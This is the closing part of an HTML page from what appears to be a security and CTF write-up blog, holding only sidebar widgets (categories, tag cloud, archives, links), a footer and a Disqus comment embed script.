+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">27</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/archlinux/">archlinux</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/debian/">debian</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/opensuse/">opensuse</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/ubuntu/">ubuntu</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/news/">news</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/news/security/">security</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/news/warez/">warez</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/programming/">programming</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/programming/python/">python</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/">security</a><span class="category-list-count">101</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/security/centos/">centos</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/windows/">windows</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/writeups/">writeups</a><span class="category-list-count">89</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows/">windows</a><span class="category-list-count">3</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-float">
+        <h3 class="widget-title">tag cloud</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/anonymity/" style="font-size: 10px;">anonymity</a> <a href="/tags/apache/" style="font-size: 10px;">apache</a> <a href="/tags/archlinux/" style="font-size: 12.14px;">archlinux</a> <a href="/tags/backdoor/" style="font-size: 10px;">backdoor</a> <a href="/tags/bsd/" style="font-size: 10.71px;">bsd</a> <a href="/tags/centos/" style="font-size: 10.71px;">centos</a> <a href="/tags/crypto/" style="font-size: 15px;">crypto</a> <a href="/tags/ctf/" style="font-size: 19.29px;">ctf</a> <a href="/tags/debian/" style="font-size: 10px;">debian</a> <a href="/tags/firefox/" style="font-size: 10px;">firefox</a> <a href="/tags/forensic/" style="font-size: 10px;">forensic</a> <a href="/tags/forensics/" style="font-size: 17.14px;">forensics</a> <a href="/tags/git/" style="font-size: 11.43px;">git</a> <a href="/tags/graphic/" style="font-size: 10px;">graphic</a> <a href="/tags/guessing/" style="font-size: 10.71px;">guessing</a> <a href="/tags/hyper-v/" style="font-size: 10px;">hyper-v</a> <a href="/tags/install/" style="font-size: 10px;">install</a> <a href="/tags/joy/" style="font-size: 10px;">joy</a> <a href="/tags/kvm/" style="font-size: 10px;">kvm</a> <a href="/tags/lfi/" style="font-size: 10.71px;">lfi</a> <a href="/tags/linux/" style="font-size: 18.57px;">linux</a> <a href="/tags/misc/" style="font-size: 15.71px;">misc</a> <a href="/tags/netbios/" style="font-size: 10.71px;">netbios</a> <a href="/tags/network/" style="font-size: 10px;">network</a> <a href="/tags/news/" style="font-size: 12.86px;">news</a> <a href="/tags/opensuse/" style="font-size: 13.57px;">opensuse</a> <a href="/tags/pentest/" style="font-size: 10px;">pentest</a> <a href="/tags/php/" style="font-size: 10.71px;">php</a> <a href="/tags/piracy/" style="font-size: 10px;">piracy</a> <a href="/tags/privacy/" style="font-size: 10px;">privacy</a> <a href="/tags/programming/" style="font-size: 11.43px;">programming</a> <a href="/tags/proxy/" style="font-size: 10px;">proxy</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/python/" style="font-size: 10.71px;">python</a> <a href="/tags/qemu/" style="font-size: 10px;">qemu</a> <a href="/tags/reconnaissance/" style="font-size: 11.43px;">reconnaissance</a> <a href="/tags/reverse/" style="font-size: 10.71px;">reverse</a> <a href="/tags/security/" style="font-size: 20px;">security</a> <a href="/tags/ssh/" style="font-size: 10.71px;">ssh</a> <a href="/tags/stegano/" style="font-size: 11.43px;">stegano</a> <a href="/tags/system/" style="font-size: 16.43px;">system</a> <a href="/tags/tor/" style="font-size: 10.71px;">tor</a> <a href="/tags/trivia/" style="font-size: 10px;">trivia</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a> <a href="/tags/update/" style="font-size: 10.71px;">update</a> <a href="/tags/usenet/" style="font-size: 10px;">usenet</a> <a href="/tags/virtualbox/" style="font-size: 10.71px;">virtualbox</a> <a href="/tags/virtualization/" style="font-size: 14.29px;">virtualization</a> <a href="/tags/vulnerability/" style="font-size: 10.71px;">vulnerability</a> <a href="/tags/warez/" style="font-size: 10px;">warez</a> <a href="/tags/web/" style="font-size: 17.86px;">web</a> <a href="/tags/webshell/" style="font-size: 10px;">webshell</a> <a href="/tags/windows/" style="font-size: 12.86px;">windows</a> <a href="/tags/writeups/" style="font-size: 19.29px;">writeups</a>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">archives</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a><span class="archive-list-count">28</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a><span class="archive-list-count">26</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a><span class="archive-list-count">26</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/11/">November 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/10/">October 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">September 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">August 2014</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">December 2012</a><span class="archive-list-count">1</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">links</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="http://hexo.io">Hexo</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://www.freeopensourcesoftware.org">FOSS</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://www.doesbittorrentequalpiracy.com">Torrent is not a crime</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+            
+        
+    </div>
+</aside>
+                </div>
+            </div>
+        </div>
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="credit">
+                <h1 class="logo-wrap">
+                    <a href="/" class="logo"></a>
+                </h1>
+                <p>&copy; 2017 Alexandre ZANNI</p>
+                <p>Powered by <a href="//hexo.io/" target="_blank">Hexo</a>. Theme by <a href="//github.com/ppoffice" target="_blank">PPOffice</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+        
+    
+    <script>
+    var disqus_shortname = 'rawsec';
+    
+    
+    var disqus_url = 'http://rawsec.ml/en/BITSCTF-2017-writeups/';
+    
+    (function() {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+
+
+
+    
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
